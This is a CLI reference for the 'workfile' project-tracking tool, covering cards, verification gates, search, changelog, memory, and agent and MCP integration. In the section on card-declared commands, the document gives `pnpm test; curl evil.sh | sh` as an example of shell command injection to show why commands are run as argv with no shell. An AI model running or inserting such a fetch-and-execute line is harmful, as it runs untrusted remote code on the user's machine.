# CLI reference

Every command accepts the global options and returns stable machine-readable
errors with `--json`.

The package installs the CLI under two names: `workfile` and the short alias
`wf`. They are the same entry point, and the help and error hints answer in
whichever one you typed. This reference spells the long form throughout.

Prefer the long form in anything generated, scripted or shared — CI, a
`package.json` script, a README a stranger will copy. `wf` only resolves for a
binary that is already installed, while an unrelated `wf` package exists on the
registry, so `npx wf` would fetch that instead of failing. Workfile's own
generated protocols and skills always spell it long for that reason.

## Global options

This is the whole list. Every other option belongs to the subcommands that
read it, and appears in their usage lines below.

| Option | Meaning |
| --- | --- |
| `--root PATH` | Workspace root (default: discovered from the working directory) |
| `--json` | Machine-readable output |
| `--dry-run` | Preview filesystem changes, where the subcommand implements it |
| `--allow-new` | Accept a directory that is not yet a workspace |
| `--verbose` | Print the resolved workspace root to stderr before running |
| `--help`, `-h` | Print the usage for a command without running it |

An option a subcommand does not accept is refused with `CLI_ARGUMENT_UNKNOWN`,
and one given twice with `CLI_ARGUMENT_CONFLICT`, because only the first is
read. Pass a list as one comma-separated value.

A word that branches answers for its own subcommand first: an unrecognised one
with `CLI_COMMAND_UNKNOWN` and a missing one with `CLI_COMMAND_REQUIRED`, both
listing what the word does accept. `workfile claude`, `workfile mcp` and
`workfile migrate` are the exceptions — they run `check`, `serve` and `apply`
respectively, and are checked as though you had typed those.

`--dry-run` is global but not universal. It is accepted everywhere so that no
caller has to remember where it works, and then refused with
`CLI_FLAG_UNSUPPORTED` on any command that would have written anyway — naming
the read-only command to look with instead, such as `changelog preview` or
`card show`. Silently making the change would be the alternative.

These four read as global for a while and are not. They are listed here because
the wrong version of this table shipped, and a reader who learned it from that
one needs to find the correction where the mistake was.

| Option | Subcommands that accept it |
| --- | --- |
| `--expected-revision REV` — reject the write when the file changed since it was read | `card ac`, `card archive`, `card claim`, `card note`, `card patch`, `card release`, `card reopen`, `card transition`, `card write`, `changelog patch`, `changelog release`, `doc move`, `doc patch`, `memory graduate`, `memory patch`, `memory supersede` |
| `--force` — proceed past the check the command would otherwise fail | `agents sync`, `card claim`, `card patch`, `card release`, `card transition`, `ci sync`, `claude install`, `claude sync`, `init`, `migrate apply` |
| `--reason TEXT` — why a check was waived; recorded on the card | `card claim`, `card patch`, `card release`, `card transition` |
| `--read-only` — load the workspace read-only: every write answers `WORKSPACE_READ_ONLY` | `mcp config`, `mcp inspect`, `mcp serve`, `mcp stdio`, `ui` |
| `--yes` — accept the initializer defaults without prompting | `init` |

Exit codes: `3` stale revision · `2` configuration error · `1` validation / not found.

## Accepted spellings

The dispatcher answers to more words than this reference spells. Each pair below
reaches the same code — there is no behavioural difference, and neither spelling
is deprecated. The left column is what the rest of this document uses.

| Documented | Also accepted |
| --- | --- |
| `workfile doc …` | `workfile docs …` |
| `workfile changelog …` | `workfile history …` |
| `workfile ui` | `workfile serve` |
| `workfile agents check` | `workfile agents status` |
| `workfile ci check` | `workfile ci status` |
| `workfile changelog add` | `workfile changelog create` |
| `workfile memory add` | `workfile memory create` |
| `workfile claude install` | `workfile claude sync` |
| `workfile mcp serve` | `workfile mcp stdio` |

They are listed because an alias nobody documents is one nobody can rely on: it
resolves today, it is not in `--help`, and the only way to learn it is to read
the dispatcher. A test requires every subcommand the binary accepts to be named
somewhere in this file, so a new spelling that skips this table fails the suite
rather than arriving undocumented.

## Workspace

```bash
workfile init [--root PATH] [--yes] [--dry-run] [--name NAME]
workfile version                # the installed package version, one line
workfile schema [--json]        # effective runtime schema (areas, vocabularies, verification policy…)
workfile doctor [--json] [--severity error|warning] [--max-issues N] [--rebuild-cache] [--fix]
workfile doctor --new              # only what appeared since the baseline
workfile doctor --accept-baseline  # record the current state as known
workfile upgrade [--dry-run] [--json]
workfile ui [--host HOST] [--port PORT] [--allowed-host HOST] [--read-only] [--verbose]
workfile next [--actor ACTOR] [--area AREA,AREA] [--limit N] [--json]
workfile search QUERY [--kind card,doc,change,release,memory] [--limit N] [--mode auto|lexical|hybrid] [--json]
```

`ui` serves the board on `ui.port` from `project.config.mjs`, which is `4747`
until a workspace says otherwise. Two projects therefore ask for the same port,
so a taken default moves aside: the board comes up on the next free port and
says which project holds the one it wanted. A port you named yourself does not
move — an explicit `--port` that is in use fails with `UI_PORT_IN_USE` rather
than landing somewhere you did not ask for. Set `ui.port` per project to keep
each board at an address you can remember.

`ui --read-only` serves the same board with the workspace loaded read-only:
every mutating route answers `409 WORKSPACE_READ_ONLY`, the index cache is not
written, and the UI drops its editing affordances rather than offering writes
that cannot land. That is the shape to publish — a shared board people read.

`ui --allowed-host HOST` names a host the board may answer to, repeatable and
comma-separable. It is required to publish one at all: the server refuses any
`Host` outside its allowlist (the guard that makes DNS rebinding fail), and
that list is the loopback set plus `--host` — which contributes nothing when
`--host` is `0.0.0.0`, the value serving from a container needs. Named hosts
are added to the loopback set, not swapped for it, so a container healthcheck
on `localhost` keeps working. `--allowed-host '*'` turns the check off; the
server has no authentication of its own, so anything published that way needs
something in front of it that does.

`next` answers what to pick up now: work you already claimed first, then
unblocked cards by priority, with unmet dependencies excluded rather than ranked
low. Every row carries the reason it was offered. It is the same ranking the
`project_next` MCP tool serves.

`doctor` reports absolute state, which stops being useful the moment a
repository carries inherited debt: a clean run and an unchanged dirty one look
alike, so nobody can require it. `--accept-baseline` writes the current issue set
to `.project/doctor-baseline.json`, and `--new` then reports only what appeared
afterwards, exiting `1` on anything new and `0` otherwise.

`doctor --fix` repairs the three findings a repair can be derived from: a
duplicate ID on any record kind, a filename whose slug no longer matches the
card's title, and protocol trail entries written outside `## Activity`. It never
invents content, and it never hides what it did not do — a collision it cannot
heal is printed as `cannot fix:` with the reason, and the run still fails on it.

That file is committed on purpose. A baseline under the cache would be
per-clone and missing in CI, which is the one place a "nothing new" verdict has
to hold, and keeping it in the tree puts newly accepted debt in the diff where a
reviewer can see it. Issues are matched on rule, subject and message, so two
different problems from the same rule against the same card stay distinct.
`--new` answers "did I make this worse"; plain `doctor` is still where you go to
ask whether anything is wrong at all.

`search` is lexical by default and becomes hybrid automatically when
`project.config.mjs` declares an integration with a semantic search provider
(`export const integrations = [...]`; `search.provider` selects one by id when
several are declared). `--mode lexical` opts out for a run; `--mode hybrid`
fails with `SEARCH_PROVIDER_UNAVAILABLE` instead of silently degrading when no
provider is available. `--json` reports which mode actually ran. Workfile never
sends repository content to a network service by itself — a provider only runs
if the repository explicitly declares it.

The first-party provider is
[`@illodev/workfile-search-local`](https://github.com/illodev/workfile/tree/main/packages/search-local#readme):
on-device embeddings via transformers.js, cached by content hash, fully
offline after the first model download.

`upgrade` is the one command to run after bumping `@illodev/workfile`: it
compares the installed version against the stamp on every managed surface the
config owns (agent adapters, CI templates, the Claude Code surface) and
resyncs the ones behind — including surfaces whose *content* is current but
whose stamp is old, which the staleness checks deliberately ignore. Managed
blocks whose kind no configured target owns are reported instead of silently
fossilizing.

### Query grammar

One grammar, shared by the CLI, the HTTP API, MCP and the interface — the same
string returns the same answer everywhere, which it did not before.

| Form | Meaning |
| --- | --- |
| `billing retry` | free text over id, title, metadata and body, ranked |
| `"exact phrase"` | one term, not two |
| `status:doing` | field filter; narrows rather than ranking |
| `area:ui type:bug` | filters combine with AND |
| `-status:done` | negated filter |
| `-draft` | negated term |
| `tag:` / `claim:` | aliases for `tags` and `claimed_by` |
| `/timeout \d+/i` | regular expression over id, title and body; flags from `imsu` |

Field names are the record's own keys, so the vocabulary follows the runtime
schema rather than a second list. An unknown field matches nothing instead of
falling back to free text, which would quietly return everything.

Text is compared with diacritics folded, so `diseno` finds `Diseño`.

Only the full `/pattern/flags` form runs as a regex — a slash inside a plain
query does not. Regex queries are exact-intent: they bypass the semantic
provider, rank title hits above body hits and match count after that, and
report `mode: "regex"`. Patterns are capped at 256 characters, bodies scanned
to their first 20,000; an invalid pattern fails with `SEARCH_REGEX_INVALID`.

Your pattern runs in a worker thread with a two-second deadline, and a pattern
that exceeds it fails with `SEARCH_REGEX_TIMEOUT`. Those caps bound the input;
nothing bounds backtracking, and a pattern like `(a+)+$` takes 57 seconds
against a 32-character body — the thread is the only thing with a stop button
on it. The ordinary cost is about 50ms of thread startup, paid only by regex
queries.

## Work (cards)

```bash
workfile card list [--status S] [--area A] [--type T] [--priority P] [--parent ID]
                  [--claimed-by ACTOR] [--unclaimed] [--tag TAG] [--updated-since DATE]
                  [--axis NAME=VALUE] [--limit N] [--offset N] [--fields a,b]
                  [--with-body] [--json]
workfile card show ID [--json]
workfile card create --title TITLE [--area AREA] [--type TYPE] [--priority PRIORITY]
                    [--parent ID] [--source PATH] [--tags a,b] [--scope PATH,PATH]
                    [--depends ID,ID] [--related ID,ID] [--origin ID,ID]
                    [--milestone M] [--effort S|M|L]
                    [--start DATE] [--due DATE] [--body TEXT] [--axis NAME=VALUE]
workfile card create --json-input FILE
workfile card patch ID --json-input FILE [--expected-revision REV]
workfile card patch ID --axis NAME=VALUE          # repeatable; empty value clears it
workfile card claim ID [--scope PATH,PATH] [--actor ACTOR] [--force --reason TEXT]
workfile card release ID [--actor ACTOR] [--status next] [--force --reason TEXT]
workfile card transition ID STATUS [--actor ACTOR] [--force --reason TEXT]
workfile card transition ID done [--method local|ci|manual] [--run URL] [--evidence TEXT]
workfile card release ID --status done [--method ci --run URL]
workfile card patch ID --json-input FILE [--method manual --evidence TEXT]
workfile card archive ID [--actor ACTOR]
workfile card reopen ID [--status backlog] [--actor ACTOR]
workfile card reap [--dry-run] [--older-than HOURS] [--json]
workfile card renumber ID|FILE [--to T-0123] [--actor ACTOR]
workfile card renumber --duplicates [--actor ACTOR]
workfile card ac ID                              # list criteria with their numbers
workfile card ac ID --check 1,3 --check 5        # repeatable, comma lists accepted
workfile card ac ID --uncheck 2
workfile card verify ID [--only gate] [--actor ACTOR]   # run the declared commands
```

Acceptance criteria are the `- [ ]` items under a `## Acceptance criteria` heading.
The storage does not change — it renders on GitHub and `grep` finds it. What `ac` adds
is that they are addressable. Numbers are positional, and every write carries the usual
lock and revision check, so a concurrent reorder is refused rather than quietly applied
to the wrong line.

`card transition ID done` refuses while any criterion is unproven and names the ones
that are, because `done` means verified where the code actually runs. `--force` gets
through for the cases the criteria did not anticipate, and takes `--reason TEXT`,
which the card's trail carries in place of the gate:

```text
- 2026-08-05 11:04Z alice@studio · review → done (forced past 3 unproven criteria: the last two need hardware CI does not have)
```

The reason is required only when `--force` actually waives something — the gate names
what it let through, so a `--force` that nothing refused records nothing and asks for
nothing. Taking another actor's claim is the other waivable gate, and it is written the
same way.

Reaching `done` also writes a `verified` block into the card's frontmatter — when,
how, at which commit, and a digest of the criteria it was proved against. `--method`
says which tier it was:

| Method | Means | Needs |
| --- | --- | --- |
| `local` | A command ran on your machine. Self-reported, and what you get when you pass no method. | — |
| `ci` | A run anyone can open. | `--run URL` |
| `manual` | A person judged something no command expresses. | `--evidence TEXT` and an actor |

There is no `--method forced`. `forced` is what the record says when `--force` walked
the gate past something, derived rather than asked for, and asking for it is refused —
what was waived and why is already on the trail line above, and writing it twice would
give the record two places to disagree. The three flags are refused, not dropped, on a
write that does not close the card: `card transition ID review --method ci` is an
instruction with nowhere to go, and exiting 0 on it is the one failure an agent cannot
notice. `--evidence` is collapsed onto one line and written under the card's `## Notes`.

`doctor` reports, without failing, a card verified against criteria text that has since
changed, and a card whose commit is no longer an ancestor of HEAD. Neither is enforced
retroactively: they are information about work that is already closed.

### Which methods an area accepts

Which of the three a close may use is the project's to declare, per area, under
`cards.verification.methods`:

```js
cards: {
    areas: ["api", "web", "docs"],
    verification: {
        methods: { api: ["ci"], docs: ["ci", "manual"], "*": ["ci", "local"] }
    }
}
```

`*` answers for every area not named, including the ones somebody adds next month —
without it a new area escapes the policy in silence. Declare nothing and every method
is accepted, which is what your project does today.

Closing a card by a method its area does not accept is refused with
`CARD_VERIFICATION_METHOD_REFUSED`, and the message names what the area does accept.
**Passing no method does not exempt you**: a close with no `--method` records `local`,
so under `{ api: ["ci"] }` a bare `card transition ID done` on an `api` card is refused
too — a gate you get past by typing less is not a gate. `workfile schema --json` reports
the policy under `cards.verification`, so an agent can read it instead of discovering it
by being refused.

It is the third gate a close meets, and it is waived the same way as the other two:
`--force` with `--reason TEXT` gets through, the trail line names the area's
verification policy among what it waived, and the card then records `forced` rather
than the method that was refused. That is also why a forced close must not carry
`--method`: the record has one answer for how the card was proved, and on a forced
close that answer is `forced`.

`doctor` reports two more findings, neither of them failing. A `done` card whose
recorded method the policy no longer accepts is `verification-method-unaccepted` —
tightening a policy must not invalidate work that already shipped. A policy naming an
area `cards.areas` does not declare is `verification-policy-area-unknown`, reported
rather than refused at config load: removing an area should not stop the workspace from
loading, and a config that will not load takes the doctor that would explain it with it.

`card create --json-input FILE` is the form to reach for when the card has a
body. It takes the whole record — title, body, parent, source, tags, scope — in
one call, and a JSON file survives backticks, `$` and accents that a shell
heredoc quietly mangles. The flag form above writes the same fields; it is the
body that argues for the file.

`--origin ID,ID` records which records the work came out of — the card being
worked when it was found, the decision that produced it. Any record kind, not
cards only. It is provenance, not decomposition: use `--parent` when the card is
genuinely part of another, and `--origin` when it merely came out of it. There
is no `card patch --origin`; patching any card field goes through
`--json-input`, the same as every other field. `agents context --card ID` reads
it back in both directions, and `doctor` reports an origin that resolves to
nothing.

`--axis NAME=VALUE` writes a classification axis the project declares under
`cards.axes` — a second axis alongside `area`, for domains rather than delivery
layers. Run `workfile schema --json` to see which axes exist and what each
accepts; an undeclared axis and a value outside its vocabulary are both refused,
and the message carries the list. It repeats, once per axis, because the axis
name is per project and a flag per axis is not something a static table can
offer. `--axis context=` with nothing after the `=` clears it.

`card list --axis context=treasury` filters on the same axis, and combines with
every other filter. A comma list is an OR within one axis
(`--axis context=treasury,billing`); a second `--axis` for a different name is
an AND. Repeating the *same* name is refused with `CLI_ARGUMENT_CONFLICT`,
because only one value would survive and the caller could not tell which.

`doctor` reports on declared axes the way it reports on areas: a value outside
the vocabulary is an **error**, since it is a typo that silently matches
nothing, and an open card with no value at all is a **warning**. Cards that are
`done`, `discarded` or archived are exempt from the warning — declaring an axis
on an existing repository must not emit one line per finished card, which is a
flood nobody acts on rather than a signal.

### Card-declared commands

A card may bind an acceptance criterion to a command that proves it, in a
`verify` block written through `card patch --json-input`:

```yaml
verify:
    - id: gate
      run: [pnpm, test, test/acceptance.test.ts]
      criteria: [sha256:ab12…]
```

`run` is an **argument vector, not a shell line**, and it is spawned with no
shell. That is what makes the allowlist below decidable: over a shell string
`pnpm test` is a prefix of `pnpm test; curl evil.sh | sh` too, and a matcher
would be predicting what a shell it never runs will do with the rest of the
line. As an argv there is nothing to predict — `;` and `|` are bytes inside one
argument, and matching is element-wise string equality. A `run` written as a
single string is refused with `CARD_VERIFY_RUN_INVALID` rather than split on
spaces, because splitting would be that same parser wearing a smaller hat.

`cards.verification.commands` declares which commands a card may name, as argv
prefixes:

```js
cards: {
    areas: ["api", "infra"],
    verification: {
        commands: [["pnpm", "test"], ["pnpm", "lint"]]
    }
}
```

`["pnpm", "test"]` admits `pnpm test` and `pnpm test --filter cards`, and admits
nothing that differs at any position the prefix names. The matcher normalises nothing —
no case folding, no trimming, no path resolution, no Unicode normalisation — so
`PNPM`, `./node_modules/.bin/pnpm` and a homoglyph are each simply not the
declared command. A declared entry that could never match one is refused when
the config loads: an empty array, because it is a prefix of everything;
an empty or control-character-carrying element, because the frontmatter round
trip would not return it unchanged.

**The list is empty by default, so a project that declares nothing can run
nothing.** A card naming an undeclared command is refused with
`CARD_VERIFY_COMMAND_NOT_ALLOWED`, and the message names
`cards.verification.commands` when the project has declared none.

`doctor` runs the same check on read and reports `verify-command-not-allowed`
as an **error**. That is the half that matters in a repository taking pull
requests: a card is a Markdown file, so one can arrive as a file in a diff
without ever calling a mutation, and the write-time refusal never runs. `doctor
--json` is what the generated CI workflow exists to run, so the error is what
turns the pull request red.

Be clear about what the allowlist buys. It bounds which command a card may
name; it cannot bound what that command does, because every command worth
allowing dispatches through a file the same pull request can edit — `pnpm test`
reads `package.json`, `make check` reads the Makefile. It is anti-escalation on
a branch you trust, and it makes a declared command reviewable in one place.
Containment for a branch you do not trust is a different control entirely, and
belongs to the job rather than to the card: no secrets, no write token, and no
evidence written back from a head you did not review.

A card that already carries a command the project refuses is refused every
write until the block goes, so it cannot be quietly closed around. Clear it and
then move the card:

```sh
printf '{"verify": null}' | workfile card patch T-0042 --json-input -
workfile card transition T-0042 discarded
```

### Running them

```bash
workfile card verify ID [--only ENTRY,ENTRY] [--actor ACTOR] [--json]
```

Runs each declared entry and reports pass or fail per entry, then checks the
criteria the passing entries prove. It is the only thing that can: a bound
criterion is one `card ac --check` refuses, so without this command a card that
binds its criteria is a card nothing can close.

Each `run` is spawned as an argument vector with **no shell**, from the
workspace root, with stdin closed — a command that stops to ask a question would
otherwise wait for a terminal nobody is watching. Entries run one at a time:
two declared commands are usually two suites over one working tree, and
deciding a project's build is safe to run twice at once is not this tool's call
to make on its behalf. `--only` runs a subset, `--json` prints the whole report,
and the command exits `1` unless every entry that ran passed.

**What a run writes, and what it does not.** A criterion's box records what a
command decided, so only a command that decided something writes one:

| Outcome | Means | The bound criteria |
| --- | --- | --- |
| `passed` | Exit `0`. | Checked. |
| `failed` | Any other exit status. | Unchecked — a proof that no longer reproduces is not a proof. |
| `timed-out` | Killed at `cards.verification.timeoutSeconds`. | Untouched. |
| `errored` | Never started: no such command, not executable. | Untouched. |

The last two are deliberate and are not a smaller version of `failed`. Killing a
command at the timeout is us giving up and a machine with no such command has
decided even less; neither is a fact about the criterion. Unchecking there would
let a run on the wrong machine erase a proof a right one produced, and the
criterion is machine-owned, so `card ac --check` could not put it back. Both
still exit `1`, and both print why.

An entry that changes a criterion's state leaves a line on the card's trail
naming it, because a box that moved because a subprocess exited otherwise has no
author in the record at all:

```text
- 2026-08-06 09:12Z alice@studio · verify gate: pnpm test acceptance passed, checked #1, #3
- 2026-08-06 11:40Z alice@studio · verify gate: pnpm test acceptance failed (exit 1), unchecked #1, #3
```

A run that changed nothing writes no line, the same rule a repeated
`card transition` follows. `--actor` names who ran it, defaulting the way every
other card command's does.

**There is no `--dry-run`, and it is refused rather than ignored.** The flag
previews filesystem changes, and a run that spawns every declared command and
then skips the write-back has already done the part worth previewing.
`workfile card show ID --json` reports the `verify` block, which is what looking
first means here.

The commands run **outside** the card's write lock — they take minutes, and a
lock held across them would block every note, claim and status move for as long
as a suite runs. The card is read again after the last command exits and the
bindings are resolved against *that* reading, so a criterion reworded while the
tests were running is no longer bound to the entry and the write is refused by
name rather than applied to whatever line moved into that position.

How long a command gets is the project's to declare:

```js
cards: {
    verification: {
        commands: [["pnpm", "test"]],
        timeoutSeconds: 600
    }
}
```

Ten minutes by default, between 1 second and 12 hours, and there is no way to
say "no timeout": a command that never exits would otherwise hold an unattended
CI job forever. `workfile schema --json` reports the effective value under
`cards.verification`.

**On Windows, a `.cmd` shim cannot be started without a shell.** `pnpm`, `npm`
and everything in `node_modules/.bin` are `.cmd` files there, and Node refuses
to spawn one unless a shell parses the line — which is the thing the argv model
exists to avoid. Such an entry reports `errored` and changes nothing, on that
platform only. Declare something Windows can start directly, such as
`["node", "node_modules/vitest/vitest.mjs", "run"]`.

This is a CLI command and has no MCP tool or HTTP route. Executing a card's
commands is something a person asks for at a terminal, and a tool that let an
agent trigger it over a long-lived server connection is a wider decision than
the one this implements.

Claims carry an actor and optional path scope; the server refuses overlapping
scopes and releases the claim when a card leaves `doing`.

Sequential IDs are allocated per clone, so two branches can mint the same ID and
git merges both files without a conflict. Cards are the least exposed kind: a
card is created once, by whoever picks up the work, while a changelog fragment
is written by *every* branch that changes anything user-visible. `doctor --fix`
heals all of them — cards, changelog fragments, managed documents and memory
records — and picks the same survivor on every clone: the oldest `created` keeps
the ID and the rest move to the next free one, ties broken by path. A released
fragment is the exception and always keeps it, because a fragment cut into a
version is frozen and the release record lists it by ID. `card renumber
--duplicates` stays card-scoped and reports every other collision under
`skipped`.

When the moved ID was unique, every reference inside `.project/` is rewritten;
after a collision the references are ambiguous by construction, so they are
listed under `review` instead of being silently repointed. Only the ID half of
the filename moves — the title slug survives — and `doctor --fix` brings a
card's slug back in step afterwards, which it does not do for the other kinds.

A collision is refused rather than repaired when moving a record would not be
the correction — two *released* fragments carrying one ID (describe it in a new
fragment instead), a release record, an indexed file outside `docs.managedPath`
declaring a managed ID in its frontmatter, or one ID spanning two record kinds.
For each of those `doctor --fix` prints a `cannot fix:` line naming the reason
and the run still exits `1`, because the error is still there.

Filter flags take comma-separated values (`--type bug,task`) and combine with
AND. `--json` omits the Markdown body and reports `bodyBytes` instead; ask for
it with `--with-body`, or pick exactly what you need with `--fields`. Responses
carry `total`, `offset` and `truncated`.

Options are validated per **subcommand**, not per command word. `card show
--status doing` and `card patch ID --json-input p.json --title "..."` are
refused with `CLI_ARGUMENT_UNKNOWN`, and the message names the subcommand the
flag does belong to. They used to exit 0 having silently dropped the flag, which
an agent cannot detect.

An option given twice is refused with `CLI_ARGUMENT_CONFLICT`, because only the
first occurrence is read — pass a list as one comma-separated value. `card ac
--check`, `--uncheck` and `card create|patch --axis` are the exceptions and may
repeat, because something reads every occurrence.

Only `--root`, `--json`, `--dry-run` and `--allow-new` are global.

A value a filter cannot parse is refused with `CLI_OPTION_INVALID`, never
applied as a filter that matches nothing. `--updated-since` takes `YYYY-MM-DD`
(an RFC 3339 timestamp is accepted and read as its date); `--limit`, `--offset`,
`--max-issues`, `--older-than`, `--occurrences` and `--port` take whole numbers.
`--updated-since 2026-7-1` used to exit 0 with `"total": 0`, and `--limit abc`
to return an empty page under a non-zero `total`.

A claim has a lifecycle, not just a flag. The card records `claimed_by` and
`claimed_at`; the live signal lives in `.project/.cache/activity/sessions/` and
therefore outside git, because a heartbeat written into frontmatter would leave
the working tree permanently dirty. `doctor` reports `card-claim-stale` past
`cards.claimLeaseHours` and `card-claim-orphaned` when a session stops
signalling, and `workfile card reap` releases them.

## Docs

```bash
workfile doc list [--query TEXT] [--managed] [--json]
workfile doc show ID [--json]
workfile doc create --title TITLE [--kind KIND] [--status STATUS] [--folder PATH]
workfile doc move ID --folder PATH [--expected-revision REV]
workfile doc patch ID --json-input FILE [--expected-revision REV]
```

Indexed documents (from configured globs) get deterministic `PATH-*` IDs and are
read-only; managed documents live in `.project/docs/` with `DOC-NNNN` IDs.

Managed documents are loaded recursively, so folders work even when they are
created by hand. `docs.layout` decides where new documents are written — `kind`
(the default) groups them into a folder named after the document kind, `flat`
uses the managed root — and `--folder PATH` overrides it for a single command.
The path must stay inside `docs.managedPath`; `--folder ""` targets the root.
`workfile doc move` relocates a document without changing its ID or its content.

## History (changelog)

```bash
workfile changelog list [--unreleased] [--visibility public|internal] [--json]
workfile changelog show ID [--json]
workfile changelog add --title TITLE [--type fixed] [--area AREA]
workfile changelog patch ID --json-input FILE [--expected-revision REV]
workfile changelog preview [--fragments CHG-0001,CHG-0002]
workfile changelog release VERSION [--fragments CHG-0001,CHG-0002] [--title TITLE]
workfile changelog render [--visibility public|internal] [--write]
workfile changelog verify
```

Release version validation follows `changelog.releaseStrategy`: `semver`,
`calendar` or `freeform`.

## Memory

```bash
workfile memory list [--collection learnings] [--status active] [--json]
workfile memory show ID [--json]
workfile memory add COLLECTION --title TITLE [--status STATUS]
workfile memory patch ID --json-input FILE [--expected-revision REV]
workfile memory graduate ID --to CONV-0001,DOC-0001
workfile memory supersede ID --by ID
workfile memory verify
```

`add` accepts singular aliases (`learning`, `decision`, `incident`, `convention`,
`context`) as well as collection ids. Collections and prefixes:

| Collection | Prefix | Purpose |
| --- | --- | --- |
| learnings | `LRN` | Reusable observations with confidence and occurrences |
| decisions | `ADR` | Proposed / accepted / rejected / superseded decisions |
| incidents | `INC` | Operational events with severity and resolution metadata |
| conventions | `CONV` | Durable rules for humans and agents |
| context | `CTX` | Useful but potentially expiring project state |

## Agents

```bash
workfile agents sync [--targets agents-md,claude,cursor,copilot]
workfile agents check [--targets ...]
workfile agents context --card T-0001 [--limit 20]
workfile agents whoami [--json]
```

`sync` writes compact managed blocks (version + SHA-256 digest) into `AGENTS.md`,
`CLAUDE.md`, `.cursor/rules/` or `.github/copilot-instructions.md` without touching
unrelated content. `context` returns a bounded, prioritized context bundle for a card.

Accepted decisions and conventions skip the relevance filter, because a rule
binds work that does not mention it. Past `--limit` they are not cut: they come
back under **Also in force** as one titled line each, so a workspace with fifty
accepted ADRs still hands an agent every ID it must not contradict at a cost of
a line rather than a summary. Everything else that did not fit is reported as a
count under **Left out** and reachable through `search`.

`whoami` prints the actor every surface attributes mutations to, and which rung
produced it. Resolution order: an explicit `--actor`, then `$WORKFILE_ACTOR`, then
`user@host` — discriminated by a short session prefix when a session id is present,
because two agent sessions in one checkout are two actors and a shared username
would let them silently take each other's claims. Set `$WORKFILE_ACTOR` to pin a
stable name.

## Claude Code

```bash
workfile claude install [--dry-run] [--force]
workfile claude check [--json]
```

`install` writes the Claude Code surface into the repository — the MCP server
registration, the slash commands, the skill and the session hooks — as managed
blocks a later resync updates without touching anything around them. `check`
reports which of them are stale and exits `1` when any is, which is what makes
it usable in CI. Each stale file is reported with the comparison that failed —
`style`, `body`, `digest` or `trailing-newline` — because one of them is
otherwise invisible: the digest is taken over trimmed bytes, so a file that
lost its final newline agrees with its own digest and is stale over a byte no
hash covers.

`.mcp.json` and `.claude/settings.json` carry no marker to hold a digest,
because they are merged into files the repository also owns. They are compared
against the values an install would write, key by key, using the ledger at
`.project/generated/claude-code.json` that records which of them are this
tool's — so a hand-edited server registration is reported as
`mcpServers.workfile`, and a server the repository added beside it is neither
compared nor touched.

The last line of the report is not a file but the command the hooks name,
resolved. A workspace with the package installed gets
`node node_modules/@illodev/workfile/…/hooks.mjs`; one without gets the
`workfile-hooks` bin, found on `PATH`. Either can be `unreachable`, which is a
different repair from a stale file: the settings can say exactly what an
install would write and still name a hook that is not there, and a hook that
cannot run exits `0` in silence. It is reported as a warning rather than an
error, because whether a bin is on `PATH` is true on one machine and false on
another.

`workfile claude` with no subcommand runs `check`, because reporting is the
safe default for a word that otherwise writes files.

Neither command is what installs the *package* into a Claude Code session:
a client reads `.mcp.json` and starts the server itself. See
[mcp.md](mcp.md) for what `install` writes and what each hook does.

## CI templates

```bash
workfile ci sync [--targets github,gitlab,generic]
workfile ci check [--targets ...]
```

## Legacy migration

```bash
workfile migrate plan [--source .planning] [--mode copy|move]
workfile migrate apply [--source .planning] [--mode copy|move] [--force]
workfile migrate schema [--dry-run] [--json]
```

Valid v1 cards become canonical v2 records; everything else is preserved under
`.project/sources/legacy-planning/` with a written migration report.

`migrate schema` is a different job: it moves a workspace forward when the
installed package expects a newer `schemaVersion` than `.project/VERSION`
declares. Steps run in ascending order under a lock, `--dry-run` prints the plan
without writing, and the result is recorded in `.project/migrations/schema.json`
along with `upgradedWith` in `.project/VERSION`. A workspace *newer* than the
package is refused with `WORKSPACE_SCHEMA_AHEAD` — upgrade the package instead.

## MCP

```bash
workfile mcp [serve] [--read-only]
workfile mcp inspect [--json]
workfile mcp config [--read-only] [--json]
```

See [mcp.md](mcp.md) for the server contract.
